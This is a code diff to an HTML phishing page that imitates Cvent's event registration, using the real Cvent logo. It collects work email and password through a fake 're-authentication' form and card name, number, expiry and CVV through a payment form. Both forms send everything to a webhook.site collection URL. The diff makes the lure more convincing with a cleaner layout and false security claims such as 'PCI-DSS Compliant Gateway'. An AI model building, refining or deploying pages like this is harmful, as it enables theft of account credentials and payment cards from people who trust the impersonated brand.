@@ -2,55 +2,77 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Cvent Event Registration - Final Step</title>
+    <title>Cvent Event Registration - Payment & Verification</title>
     <style>
-        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 0; display: flex; height: 100vh; color: #333; }
-        .pane { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 40px; box-sizing: border-box; }
-        .left { background-color: #f8f9fa; border-right: 1px solid #ddd; }
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 0; background-color: #f8f9fa; }
+        
+        .header { background: #fff; text-align: center; padding: 25px 0; border-bottom: 1px solid #ddd; width: 100%; position: absolute; top: 0; left: 0; z-index: 10; }
+        .header img { width: 180px; }
+
+        .main-content { display: flex; height: 100vh; padding-top: 100px; box-sizing: border-box; }
+        .pane { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 40px; }
+        
+        .left { background-color: #f1f3f5; border-right: 1px solid #dee2e6; }
         .right { background-color: #ffffff; }
-        .container { width: 100%; max-width: 320px; }
-        img.logo { width: 140px; margin-bottom: 30px; }
-        h2 { font-size: 20px; margin-bottom: 10px; color: #0066cc; }
-        p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.4; }
-        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
-        .row { display: flex; gap: 10px; }
-        button { width: 100%; padding: 14px; background-color: #0066cc; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
-        button:hover { background-color: #0052a3; }
-        .footer-text { margin-top: 20px; font-size: 11px; color: #999; }
+        
+        .container { width: 100%; max-width: 340px; }
+        h2 { font-size: 22px; margin-bottom: 15px; color: #0066cc; font-weight: 500; }
+        p { font-size: 14px; color: #555; margin-bottom: 30px; line-height: 1.5; }
+        
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; font-size: 15px; transition: border 0.3s; }
+        input:focus { border-color: #0066cc; outline: none; }
+        
+        .row { display: flex; gap: 12px; }
+        button { width: 100%; padding: 15px; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: transform 0.1s, background 0.3s; }
+        button:active { transform: scale(0.98); }
+        
+        .btn-blue { background-color: #0066cc; }
+        .btn-blue:hover { background-color: #0056b3; }
+        .btn-green { background-color: #28a745; }
+        .btn-green:hover { background-color: #218838; }
+        
+        .footer-text { margin-top: 25px; font-size: 12px; color: #adb5bd; text-align: center; }
+        .secure-badge { display: flex; align-items: center; justify-content: center; gap: 5px; color: #28a745; font-weight: bold; margin-top: 10px; font-size: 12px; }
     </style>
 </head>
 <body>
 
-    <!-- LEFT SIDE: LOGIN -->
-    <div class="pane left">
-        <div class="container">
-            <img src="https://www.cvent.com/sites/default/files/cvent-logo.png" alt="Cvent" class="logo">
-            <h2>Account Verification</h2>
-            <p>For your security, please re-authenticate your Cvent account to continue.</p>
-            <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
-                <input type="email" name="email" placeholder="Work Email" required>
-                <input type="password" name="password" placeholder="Password" required>
-                <button type="submit">Verify Identity</button>
-            </form>
-            <div class="footer-text">Secure single sign-on (SSO) enabled.</div>
-        </div>
-    </div>
+    <!-- TOP LOGO HEADER -->
+    <header class="header">
+        <img src="https://www.cvent.com/sites/default/files/cvent-logo.png" alt="Cvent Logo">
+    </header>
 
-    <!-- RIGHT SIDE: PAYMENT -->
-    <div class="pane right">
-        <div class="container">
-            <h2>Payment Details</h2>
-            <p>Finalize your registration by paying the event fee of <b>$250.00 USD</b>.</p>
-            <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
-                <input type="text" name="cc_name" placeholder="Full Name on Card" required>
-                <input type="text" name="cc_number" placeholder="Card Number" required>
-                <div class="row">
-                    <input type="text" name="cc_exp" placeholder="MM/YY" required>
-                    <input type="text" name="cc_cvv" placeholder="CVV" required>
-                </div>
-                <button type="submit" style="background-color: #28a745;">Complete Payment</button>
-            </form>
-            <div class="footer-text">Protected by AES-256 bank-level encryption.</div>
+    <div class="main-content">
+        <!-- LEFT SIDE: LOGIN/SSO -->
+        <div class="pane left">
+            <div class="container">
+                <h2>Account Re-Authentication</h2>
+                <p>For your security, please verify your work email and password to access your secure event profile.</p>
+                <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
+                    <input type="email" name="email" placeholder="Work Email" required autocomplete="username">
+                    <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+                    <button type="submit" class="btn-blue">Verify & Synchronize</button>
+                </form>
+                <div class="secure-badge">🔒 Encrypted SSO Connection</div>
+            </div>
+        </div>
+
+        <!-- RIGHT SIDE: CREDIT CARD -->
+        <div class="pane right">
+            <div class="container">
+                <h2>Finalize Event Payment</h2>
+                <p>Registration Fee: <b>$250.00 USD</b><br>Please enter your payment details below to secure your seat.</p>
+                <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
+                    <input type="text" name="cc_name" placeholder="Name on Card" required>
+                    <input type="text" name="cc_number" placeholder="Card Number" required maxlength="16">
+                    <div class="row">
+                        <input type="text" name="cc_exp" placeholder="MM / YY" required maxlength="5">
+                        <input type="text" name="cc_cvv" placeholder="CVV" required maxlength="4">
+                    </div>
+                    <button type="submit" class="btn-green">Pay & Complete Registration</button>
+                    <div class="footer-text">PCI-DSS Compliant Gateway</div>
+                </form>
+            </div>
         </div>
     </div>
 
